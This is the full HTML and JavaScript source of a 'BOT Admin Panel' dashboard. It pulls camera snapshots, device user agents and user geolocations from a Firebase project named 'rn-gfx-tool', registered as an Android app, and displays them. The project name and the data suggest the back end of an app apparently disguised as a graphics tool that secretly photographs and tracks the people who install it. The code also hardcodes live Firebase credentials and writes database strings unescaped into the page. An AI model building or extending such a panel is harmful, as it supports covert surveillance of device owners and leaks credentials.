<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BOT Admin Panel</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <!-- Chart.js -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #34495e;
            --accent-color: #3498db;
            --danger-color: #e74c3c;
            --success-color: #2ecc71;
            --warning-color: #f39c12;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f7fa;
            color: #333;
            line-height: 1.6;
        }
        .container {
            display: grid;
            grid-template-columns: 250px 1fr; /* Desktop default */
            min-height: 100vh;
        }
        /* Sidebar */
        .sidebar {
            background: var(--primary-color);
            color: white;
            padding: 20px 0;
            box-shadow: 2px 0 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            padding: 0 20px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logo h2 {
            font-size: 1.5rem;
            margin-bottom: 5px;
        }
        .logo p {
            font-size: 0.8rem;
            opacity: 0.7;
        }
        .nav-menu {
            margin-top: 20px;
        }
        .nav-item {
            padding: 12px 20px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
        }
        .nav-item:hover, .nav-item.active {
            background: rgba(255,255,255,0.1);
        }
        .nav-item i {
            margin-right: 10px;
            font-size: 1.1rem;
        }
        /* Main Content */
        .main-content {
            padding: 20px;
            overflow-y: auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #ddd;
        }
        .header h1 {
            font-size: 1.8rem;
            color: var(--primary-color);
        }
        .user-info {
            display: flex;
            align-items: center;
        }
        .user-info img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            margin-right: 10px;
        }
        /* Mobile Nav Toggle (Hamburger) */
        .mobile-nav-toggle {
            display: none; /* Hidden by default on desktop */
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            font-size: 1.2rem;
            cursor: pointer;
            z-index: 1001; /* Ensure it's above content */
            margin-right: 15px; /* Space from title */
        }
        /* Cards */
        .cards {
            display: grid;
            grid-template-columns: repeat(4, 1fr); /* Desktop default */
            gap: 20px;
            margin-bottom: 30px;
        }
        .card {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .card h3 {
            font-size: 0.9rem;
            color: #7f8c8d;
            margin-bottom: 10px;
        }
        .card .value {
            font-size: 1.8rem;
            font-weight: bold;
            color: var(--primary-color);
        }
        .card .trend {
            display: flex;
            align-items: center;
            margin-top: 10px;
            font-size: 0.9rem;
        }
        .trend.up {
            color: var(--success-color);
        }
        .trend.down {
            color: var(--danger-color);
        }
        /* Charts */
        .chart-container {
            background: white;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .chart-container h2 {
            margin-bottom: 20px;
            color: var(--primary-color);
        }
        .chart-row {
            display: grid;
            grid-template-columns: 1fr 1fr; /* Desktop default */
            gap: 20px;
            margin-bottom: 30px;
        }
        /* Data Tables */
        .data-table {
            background: white;
            border-radius: 8px;
            overflow: hidden; /* For table container */
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            margin-bottom: 30px;
        }
        .table-header {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap; /* Allow actions to wrap on smaller screens */
            gap: 10px; /* Spacing for wrapped items */
        }
        .table-header h2 {
            color: var(--primary-color);
            flex-grow: 1; /* Allow title to take space */
        }
        .table-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 8px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: all 0.3s;
            min-width: 80px; /* Ensure buttons are tappable */
            text-align: center;
        }
        .btn-primary {
            background: var(--accent-color);
            color: white;
        }
        .btn-danger {
            background: var(--danger-color);
            color: white;
        }
        .btn-success {
            background: var(--success-color);
            color: white;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            /* Enable horizontal scrolling for tables on small screens */
            display: block; /* Make table a block element to allow overflow */
            overflow-x: auto; /* Enable horizontal scrolling */
            white-space: nowrap; /* Prevent content from wrapping inside cells */
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
            vertical-align: middle;
        }
        th {
            background: #f8f9fa;
            font-weight: 600;
            color: var(--primary-color);
        }
        tr:hover {
            background: #f8f9fa;
        }
        .status {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
        }
        .status.active {
            background: #d4edda;
            color: #155724;
        }
        .status.inactive {
            background: #f8d7da;
            color: #721c24;
        }
        /* Image Preview */
        .image-preview {
            width: 60px;
            height: 60px;
            object-fit: cover;
            border-radius: 4px;
            cursor: pointer;
            transition: transform 0.3s;
        }
        .image-preview:hover {
            transform: scale(1.5);
        }
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: white;
            border-radius: 8px;
            max-width: 800px;
            width: 90%;
            max-height: 90vh;
            overflow: auto;
            position: relative;
        }
        .modal-header {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header h2 {
            color: var(--primary-color);
        }
        .close-modal {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #7f8c8d;
        }
        .modal-body {
            padding: 20px;
        }
        .modal-image {
            width: 100%;
            max-height: 70vh;
            object-fit: contain;
        }
        .image-meta {
            margin-top: 20px;
        }
        .meta-item {
            margin-bottom: 10px;
        }
        .meta-label {
            font-weight: bold;
            color: var(--primary-color);
            display: inline-block;
            width: 120px;
        }
        /* Map Container */
        #mapContainer {
            height: 400px;
            width: 100%;
            border-radius: 8px;
            overflow: hidden;
            margin-top: 20px;
        }
        /* Live Camera Feed Specific Styles */
        .live-camera-controls {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        #liveVideo {
            width: 100%;
            max-width: 600px;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            background-color: #000; /* Black background for video */
        }
        .current-live-image-container {
            margin-top: 20px;
            text-align: center;
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .current-live-image-container img {
            max-width: 100%;
            max-height: 400px;
            object-fit: contain;
            border-radius: 4px;
            margin-bottom: 15px;
        }
        .current-live-image-container p {
            color: #555;
            font-size: 0.9rem;
        }

        /* Overlay for mobile sidebar */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }

        /* Responsive Breakpoints */

        /* Tablets and smaller laptops (e.g., up to 1200px) */
        @media (max-width: 1200px) {
            .cards {
                grid-template-columns: repeat(2, 1fr); /* 2 columns for cards */
            }
            .chart-row {
                grid-template-columns: 1fr; /* Stack charts */
            }
        }

        /* Mobile devices (e.g., up to 768px) */
        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr; /* Single column layout */
            }
            .sidebar {
                position: fixed;
                top: 0;
                left: -250px; /* Hide sidebar off-screen */
                height: 100vh;
                overflow-y: auto;
                transition: left 0.3s ease-in-out;
                z-index: 1000; /* Bring sidebar above content */
            }
            /* When sidebar is open */
            body.sidebar-open .sidebar {
                left: 0; /* Slide in */
            }
            body.sidebar-open .overlay {
                display: block; /* Show overlay */
            }
            .main-content {
                padding: 15px; /* Adjust padding for smaller screens */
            }
            .header {
                justify-content: flex-start; /* Align header items to start */
            }
            .header h1 {
                font-size: 1.5rem;
                flex-grow: 1; /* Allow title to expand */
            }
            .user-info {
                display: none; /* Hide user info on small screens for simplicity */
            }
            .mobile-nav-toggle {
                display: block; /* Show hamburger on mobile */
            }
            .cards {
                grid-template-columns: 1fr; /* Single column for cards */
            }
            .table-header {
                flex-direction: column;
                align-items: flex-start;
            }
            .table-actions {
                width: 100%;
                justify-content: flex-start;
                margin-top: 10px;
            }
            .btn {
                width: auto; /* Allow buttons to size naturally */
                min-width: unset;
                flex-grow: 1; /* Make buttons fill available width if needed */
            }
            /* Modals should be almost full screen on mobile */
            .modal-content {
                width: 95%;
                max-width: 95%;
                height: 95%;
                max-height: 95%;
                margin: auto; /* Center it */
            }
            .modal-body {
                padding: 15px;
            }
            .modal-image {
                max-height: 60vh;
            }
            .image-meta {
                font-size: 0.9rem;
            }
            .meta-label {
                width: 100px; /* Adjust label width */
            }

            /* Adjust table font size */
            th, td {
                font-size: 0.85rem;
            }
        }
    </style>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Leaflet for maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
</head>
<body>
    <div class="container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="logo">
                <h2>BOT Admin</h2>
                <p>Monitoring Dashboard</p>
            </div>
            <div class="nav-menu">
                <div class="nav-item active" data-section="dashboard">
                    <i class="fas fa-tachometer-alt"></i>
                    <span>Dashboard</span>
                </div>
                <div class="nav-item" data-section="snapshots">
                    <i class="fas fa-camera"></i>
                    <span>BOT Snapshots</span>
                </div>
                 <div class="nav-item" data-section="liveCameraFeed">
                    <i class="fas fa-video"></i>
                    <span>Live Camera Feed</span>
                </div>
                <div class="nav-item" data-section="locations">
                    <i class="fas fa-map-marker-alt"></i>
                    <span>User Locations</span>
                </div>
                <div class="nav-item" data-section="devices">
                    <i class="fas fa-mobile-alt"></i>
                    <span>Device Info</span>
                </div>
                <div class="nav-item" data-section="settings">
                    <i class="fas fa-cog"></i>
                    <span>Settings</span>
                </div>
            </div>
        </div>

        <!-- Overlay for mobile sidebar -->
        <div class="overlay"></div>

        <!-- Main Content -->
        <div class="main-content">
            <div class="header">
                <button class="mobile-nav-toggle" aria-label="Open navigation">
                    <i class="fas fa-bars"></i>
                </button>
                <h1 id="currentSectionTitle">Dashboard Overview</h1>
                <div class="user-info">
                    <img src="https://ui-avatars.com/api/?name=Admin&background=3498db&color=fff" alt="Admin">
                    <span>Admin</span>
                </div>
            </div>

            <!-- Dashboard Section -->
            <div id="dashboard" class="section">
                <!-- Stats Cards -->
                <div class="cards">
                    <div class="card">
                        <h3>Total Snapshots</h3>
                        <div class="value" id="totalSnapshots">0</div>
                        <div class="trend up">
                            <i class="fas fa-arrow-up"></i>
                            <span>12% from yesterday</span>
                        </div>
                    </div>
                    <div class="card">
                        <h3>Active Today</h3>
                        <div class="value" id="activeToday">0</div>
                        <div class="trend up">
                            <i class="fas fa-arrow-up"></i>
                            <span>5% from yesterday</span>
                        </div>
                    </div>
                    <div class="card">
                        <h3>Unique Devices</h3>
                        <div class="value" id="uniqueDevices">0</div>
                        <div class="trend down">
                            <i class="fas fa-arrow-down"></i>
                            <span>3% from yesterday</span>
                        </div>
                    </div>
                    <div class="card">
                        <h3>Locations</h3>
                        <div class="value" id="totalLocations">0</div>
                        <div class="trend up">
                            <i class="fas fa-arrow-up"></i>
                            <span>8% from yesterday</span>
                        </div>
                    </div>
                </div>

                <!-- Charts Row -->
                <div class="chart-row">
                    <div class="chart-container">
                        <h2>Snapshots Timeline</h2>
                        <canvas id="snapshotsChart"></canvas>
                    </div>
                    <div class="chart-container">
                        <h2>Device Distribution</h2>
                        <canvas id="devicesChart"></canvas>
                    </div>
                </div>

                <!-- Recent Activity -->
                <div class="data-table">
                    <div class="table-header">
                        <h2>Recent Activity</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshRecent">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Device</th>
                                <th>Type</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="recentActivity">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Snapshots Section -->
            <div id="snapshots" class="section" style="display: none;">
                <div class="data-table">
                    <div class="table-header">
                        <h2>BOT Snapshots</h2>
                        <div class="table-actions">
                            <button class="btn btn-danger" id="deleteAllSnapshots">
                                <i class="fas fa-trash"></i> Delete All
                            </button>
                            <button class="btn btn-primary" id="refreshSnapshots">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Preview</th>
                                <th>Timestamp</th>
                                <th>Device</th>
                                <th>Resolution</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="snapshotsList">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Live Camera Feed Section -->
            <div id="liveCameraFeed" class="section" style="display: none;">
                <div class="chart-container">
                    <h2>Live Camera Feed</h2>
                    <p style="margin-bottom: 15px; color: #7f8c8d;">This feature accesses the camera of the device running this admin panel to provide a live feed and capture images every 5 seconds. You will be prompted for camera permission.</p>
                    <div class="live-camera-controls">
                        <button class="btn btn-success" id="startLiveFeedBtn">
                            <i class="fas fa-play"></i> Start Live Feed
                        </button>
                        <button class="btn btn-danger" id="stopLiveFeedBtn" disabled>
                            <i class="fas fa-stop"></i> Stop Live Feed
                        </button>
                    </div>
                    <video id="liveVideo" autoplay muted style="width: 100%; max-width: 600px; height: auto; display: none;"></video>
                    <canvas id="liveCanvas" style="display: none;"></canvas>

                    <div class="current-live-image-container">
                        <h3>Latest Captured Live Image</h3>
                        <img id="latestLiveImage" src="https://via.placeholder.com/400x300?text=No+Live+Image" alt="Latest Live Image">
                        <p id="latestLiveImageTimestamp">No image captured yet.</p>
                    </div>
                </div>
            </div>


            <!-- Locations Section -->
            <div id="locations" class="section" style="display: none;">
                <div class="data-table">
                    <div class="table-header">
                        <h2>User Locations</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshLocations">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Coordinates</th>
                                <th>Map Link</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="locationsList">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
                <div id="mapContainer"></div>
            </div>

            <!-- Devices Section -->
            <div id="devices" class="section" style="display: none;">
                <div class="data-table">
                    <div class="table-header">
                        <h2>Device Information</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshDevices">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Device ID</th>
                                <th>User Agent</th>
                                <th>First Seen</th>
                                <th>Last Active</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody id="devicesList">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Settings Section -->
            <div id="settings" class="section" style="display: none;">
                <div class="chart-container">
                    <h2>Admin Settings</h2>
                    <form id="adminSettings">
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold;">Snapshot Interval (seconds)</label>
                            <input type="number" id="snapshotInterval" min="1" max="60" style="padding: 8px; width: 100px; border: 1px solid #ddd; border-radius: 4px;">
                        </div>
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold;">Data Retention (days)</label>
                            <input type="number" id="dataRetention" min="1" max="365" style="padding: 8px; width: 100px; border: 1px solid #ddd; border-radius: 4px;">
                        </div>
                        <button type="button" class="btn btn-success" id="saveSettings">
                            <i class="fas fa-save"></i> Save Settings
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Image Preview Modal -->
    <div class="modal" id="imageModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Snapshot Details</h2>
                <button class="close-modal">×</button>
            </div>
            <div class="modal-body">
                <img src="" alt="Full Snapshot" class="modal-image" id="modalImage">
                <div class="image-meta" id="imageMeta">
                    <!-- Metadata and download button will be inserted here -->
                </div>
            </div>
        </div>
    </div>

    <!-- Location Map Modal -->
    <div class="modal" id="mapModal">
        <div class="modal-content" style="width: 90%; height: 90%;">
            <div class="modal-header">
                <h2>Location Details</h2>
                <button class="close-modal">×</button>
            </div>
            <div class="modal-body" style="height: calc(100% - 60px); padding: 0;">
                <div id="detailedMap" style="height: 100%;"></div>
            </div>
        </div>
    </div>

    <script>
        // Firebase Configuration (Use your actual Firebase project config)
        const firebaseConfig = {
            apiKey: "AIzaSyD6EXA7D77rQDQEohB52BvTYimFeTEaAho",
            authDomain: "rn-gfx-tool.firebaseapp.com",
            databaseURL: "https://rn-gfx-tool-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "rn-gfx-tool",
            storageBucket: "rn-gfx-tool.firebasestorage.app",
            messagingSenderId: "163149358541",
            appId: "1:163149358541:android:2ef6d22fcd23e77ee09084"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage(); // Initialize Firebase Storage

        // DOM Elements
        const sections = document.querySelectorAll('.section');
        const navItems = document.querySelectorAll('.nav-item');
        const currentSectionTitle = document.getElementById('currentSectionTitle');
        const mobileNavToggle = document.querySelector('.mobile-nav-toggle');
        const overlay = document.querySelector('.overlay');
        const modal = document.getElementById('imageModal');
        const mapModal = document.getElementById('mapModal');
        const modalImage = document.getElementById('modalImage');
        const imageMeta = document.getElementById('imageMeta');
        const closeModalButtons = document.querySelectorAll('.close-modal');
        let map, detailedMap;
        let markers = [];
        let snapshotsChart, devicesChart;

        // Live Camera Feed Elements
        const liveVideoElement = document.getElementById('liveVideo');
        const liveCanvasElement = document.getElementById('liveCanvas');
        const startLiveFeedBtn = document.getElementById('startLiveFeedBtn');
        const stopLiveFeedBtn = document.getElementById('stopLiveFeedBtn');
        const latestLiveImage = document.getElementById('latestLiveImage');
        const latestLiveImageTimestamp = document.getElementById('latestLiveImageTimestamp');

        let liveStream = null; // To hold the media stream
        let liveInterval = null; // To hold the interval ID for capturing frames

        // Section Titles for dynamic header
        const sectionTitles = {
            dashboard: "Dashboard Overview",
            snapshots: "BOT Snapshots",
            liveCameraFeed: "Live Camera Feed",
            locations: "User Locations",
            devices: "Device Information",
            settings: "Admin Settings"
        };

        // Navigation and Mobile Menu Logic
        mobileNavToggle.addEventListener('click', () => {
            document.body.classList.toggle('sidebar-open');
        });

        overlay.addEventListener('click', () => {
            document.body.classList.remove('sidebar-open');
        });

        navItems.forEach(item => {
            item.addEventListener('click', () => {
                // Remove active class from all items
                navItems.forEach(nav => nav.classList.remove('active'));
                // Add active class to clicked item
                item.classList.add('active');
                // Hide all sections
                sections.forEach(section => section.style.display = 'none');
                // Show selected section
                const sectionId = item.getAttribute('data-section');
                document.getElementById(sectionId).style.display = 'block';
                
                // Update header title
                currentSectionTitle.textContent = sectionTitles[sectionId] || "Admin Panel";

                // If on mobile, close sidebar after selecting an item
                if (window.innerWidth <= 768) {
                    document.body.classList.remove('sidebar-open');
                }
                
                // If leaving live camera feed, stop it
                if (liveStream && sectionId !== 'liveCameraFeed') {
                    stopLiveCameraFeed();
                }

                // Handle specific section initializations/data loads
                if (sectionId === 'locations') {
                    // Small delay to ensure map container is visible and sized correctly
                    setTimeout(() => {
                        if (!map) initMap();
                        map.invalidateSize(); // Invalidate size if map existed but might have been hidden
                    }, 100);
                }
                
                loadSectionData(sectionId);
            });
        });

        // Close modals
        closeModalButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                modal.style.display = 'none';
                mapModal.style.display = 'none';
            });
        });

        // Close modal when clicking outside
        window.addEventListener('click', (e) => {
            if (e.target === modal) modal.style.display = 'none';
            if (e.target === mapModal) mapModal.style.display = 'none';
        });

        // Initialize main map (on locations page)
        function initMap() {
            if (map) map.remove(); // Remove existing map if it was re-initialized
            map = L.map('mapContainer').setView([20, 0], 2);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(map);
            map.invalidateSize(); // Ensure map displays correctly
            loadLocations(); // Load locations data after map is ready
        }

        // Initialize detailed map in modal
        function initDetailedMap(lat, lng) {
            if (detailedMap) {
                detailedMap.remove(); // Remove previous map instance
            }
            detailedMap = L.map('detailedMap').setView([lat, lng], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(detailedMap);
            
            L.marker([lat, lng]).addTo(detailedMap)
                .bindPopup(`<b>User Location</b><br>Lat: ${lat}<br>Lng: ${lng}`)
                .openPopup();
            detailedMap.invalidateSize(); // Ensure map displays correctly
        }

        // Function to show location in a detailed map modal
        function viewLocationOnMap(lat, lng) {
            mapModal.style.display = 'flex';
            // Use a small delay to ensure the modal is rendered and has dimensions before initializing map
            setTimeout(() => {
                initDetailedMap(lat, lng);
            }, 100);
        }

        // Load data for a specific section
        function loadSectionData(sectionId) {
            switch(sectionId) {
                case 'dashboard':
                    loadDashboardData();
                    break;
                case 'snapshots':
                    loadSnapshots();
                    break;
                case 'liveCameraFeed':
                    loadLiveFeedData(); // Load latest live image on entering section
                    break;
                case 'locations':
                    loadLocations();
                    break;
                case 'devices':
                    loadDevices();
                    break;
                case 'settings':
                    loadSettings();
                    break;
            }
        }

        // Load dashboard data
        async function loadDashboardData() {
            try {
                // Load stats
                const snapshotsSnapshot = await database.ref('botSnapshots').once('value');
                const snapshotsData = snapshotsSnapshot.val();
                const totalSnapshots = snapshotsData ? Object.keys(snapshotsData).length : 0;
                document.getElementById('totalSnapshots').textContent = totalSnapshots;
                
                // Count today's snapshots
                const today = new Date().toDateString();
                let todayCount = 0;
                if (snapshotsData) {
                    Object.values(snapshotsData).forEach(item => {
                        const itemDate = new Date(item.timestamp).toDateString();
                        if (itemDate === today) todayCount++;
                    });
                }
                document.getElementById('activeToday').textContent = todayCount;
                
                // Count unique devices
                const devices = new Set();
                if (snapshotsData) {
                    Object.values(snapshotsData).forEach(item => {
                        if (item.deviceInfo) devices.add(item.deviceInfo);
                    });
                }
                document.getElementById('uniqueDevices').textContent = devices.size;
                
                // Load recent activity
                loadRecentActivity(snapshotsData);
                
                // Prepare data for charts
                prepareChartData(snapshotsData);

                // Load locations count
                const locationSnapshot = await database.ref('userData/location').once('value');
                const locationData = locationSnapshot.val();
                const totalLocations = locationData ? 1 : 0; // Assuming one location per user
                document.getElementById('totalLocations').textContent = totalLocations;

            } catch (error) {
                console.error('Error loading dashboard data:', error);
                alert('Failed to load dashboard data: ' + error.message);
            }
        }

        // Load recent activity
        function loadRecentActivity(snapshotsData) {
            const tbody = document.getElementById('recentActivity');
            tbody.innerHTML = '';
            
            if (!snapshotsData) {
                tbody.innerHTML = '<tr><td colspan="5">No recent activity</td></tr>';
                return;
            }
            
            // Get last 5 snapshots
            const lastSnapshots = Object.entries(snapshotsData)
                .sort((a, b) => b[1].timestamp - a[1].timestamp)
                .slice(0, 5);
            
            lastSnapshots.forEach(([key, snapshot]) => {
                const row = document.createElement('tr');
                const date = new Date(snapshot.timestamp);
                
                row.innerHTML = `
                    <td>${date.toLocaleString()}</td>
                    <td>${snapshot.deviceInfo ? snapshot.deviceInfo.substring(0, Math.min(snapshot.deviceInfo.length, 30)) + (snapshot.deviceInfo.length > 30 ? '...' : '') : 'Unknown'}</td>
                    <td>Snapshot</td>
                    <td><span class="status active">Active</span></td>
                    <td>
                        <button class="btn btn-primary" onclick="viewSnapshot('${key}')">
                            <i class="fas fa-eye"></i> View
                        </button>
                    </td>
                `;
                tbody.appendChild(row);
            });
        }

        // Prepare data for charts
        function prepareChartData(snapshotsData) {
            if (!snapshotsData) {
                if (snapshotsChart) snapshotsChart.destroy();
                if (devicesChart) devicesChart.destroy();
                return;
            }
            
            // Timeline data (last 7 days)
            const dates = [];
            const counts = [];
            const now = new Date();
            
            for (let i = 6; i >= 0; i--) {
                const date = new Date(now);
                date.setDate(date.getDate() - i);
                const dateStr = date.toDateString();
                dates.push(dateStr.substring(0, dateStr.length - 5)); // e.g., "Mon Oct 26"
                
                let count = 0;
                Object.values(snapshotsData).forEach(item => {
                    const itemDate = new Date(item.timestamp).toDateString();
                    if (itemDate === dateStr) count++;
                });
                counts.push(count);
            }
            
            // Device distribution data
            const devices = {};
            Object.values(snapshotsData).forEach(item => {
                if (!item.deviceInfo) return;
                
                // Simplify device info
                let deviceName = 'Other';
                const ua = item.deviceInfo.toLowerCase();
                
                if (ua.includes('android')) deviceName = 'Android';
                else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) deviceName = 'iOS';
                else if (ua.includes('windows')) deviceName = 'Windows';
                else if (ua.includes('macintosh') || ua.includes('macos')) deviceName = 'Mac';
                else if (ua.includes('linux')) deviceName = 'Linux';
                
                devices[deviceName] = (devices[deviceName] || 0) + 1;
            });
            
            const deviceLabels = Object.keys(devices);
            const deviceData = Object.values(devices);
            
            // Initialize or update charts
            const ctx1 = document.getElementById('snapshotsChart').getContext('2d');
            if (snapshotsChart) {
                snapshotsChart.data.labels = dates;
                snapshotsChart.data.datasets[0].data = counts;
                snapshotsChart.update();
            } else {
                snapshotsChart = new Chart(ctx1, {
                    type: 'line',
                    data: {
                        labels: dates,
                        datasets: [{
                            label: 'Snapshots per day',
                            data: counts,
                            backgroundColor: 'rgba(52, 152, 219, 0.2)',
                            borderColor: 'rgba(52, 152, 219, 1)',
                            borderWidth: 2,
                            tension: 0.3,
                            fill: true
                        }]
                    },
                    options: {
                        responsive: true,
                        plugins: {
                            legend: {
                                position: 'top',
                            }
                        },
                        scales: {
                            y: {
                                beginAtZero: true,
                                precision: 0
                            }
                        }
                    }
                });
            }
            
            const ctx2 = document.getElementById('devicesChart').getContext('2d');
            if (devicesChart) {
                devicesChart.data.labels = deviceLabels;
                devicesChart.data.datasets[0].data = deviceData;
                devicesChart.update();
            } else {
                devicesChart = new Chart(ctx2, {
                    type: 'doughnut',
                    data: {
                        labels: deviceLabels,
                        datasets: [{
                            data: deviceData,
                            backgroundColor: [
                                'rgba(52, 152, 219, 0.7)',  // Blue
                                'rgba(46, 204, 113, 0.7)',  // Green
                                'rgba(155, 89, 182, 0.7)',  // Purple
                                'rgba(241, 196, 15, 0.7)',  // Yellow
                                'rgba(231, 76, 60, 0.7)',   // Red
                                'rgba(26, 188, 156, 0.7)',  // Turquoise
                                'rgba(52, 73, 94, 0.7)'     // Dark Grey
                            ],
                            borderWidth: 1
                        }]
                    },
                    options: {
                        responsive: true,
                        plugins: {
                            legend: {
                                position: 'right',
                            }
                        }
                    }
                });
            }
        }

        // Function to view a snapshot in the modal
        async function viewSnapshot(key) {
            try {
                const snapshotRef = database.ref('botSnapshots').child(key);
                const snapshot = (await snapshotRef.once('value')).val();

                if (!snapshot) {
                    alert('Snapshot not found!');
                    return;
                }

                modalImage.src = snapshot.photo;
                
                imageMeta.innerHTML = `
                    <div class="meta-item"><span class="meta-label">Timestamp:</span> ${new Date(snapshot.timestamp).toLocaleString()}</div>
                    <div class="meta-item"><span class="meta-label">Device Info:</span> ${snapshot.deviceInfo || 'N/A'}</div>
                    <div class="meta-item"><span class="meta-label">Resolution:</span> ${snapshot.resolution || 'N/A'}</div>
                    ${snapshot.location ? `<div class="meta-item"><span class="meta-label">Location:</span> ${snapshot.location.latitude}, ${snapshot.location.longitude} <a href="${snapshot.location.mapLink}" target="_blank">(View Map)</a></div>` : ''}
                    <div class="meta-item"><span class="meta-label">File Size:</span> ${snapshot.fileSize ? (snapshot.fileSize / 1024).toFixed(2) + ' KB' : 'N/A'}</div>
                `;

                // Add download button
                const downloadBtn = document.createElement('button');
                downloadBtn.className = 'btn btn-success';
                downloadBtn.style.marginTop = '15px';
                downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download Image';
                downloadBtn.onclick = () => {
                    const link = document.createElement('a');
                    link.href = snapshot.photo;
                    // Suggest a filename based on key and timestamp
                    const dateStr = new Date(snapshot.timestamp).toISOString().replace(/[:.]/g, '-');
                    link.download = `snapshot_${key}_${dateStr}.jpg`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                };
                imageMeta.appendChild(downloadBtn);

                modal.style.display = 'flex';
            } catch (error) {
                console.error('Error viewing snapshot:', error);
                alert('Failed to load snapshot details: ' + error.message);
            }
        }

        // Function to delete a single snapshot
        async function deleteSnapshot(key) {
            if (!confirm('Are you sure you want to delete this snapshot? This action cannot be undone.')) return;

            try {
                const snapshotRef = database.ref('botSnapshots').child(key);
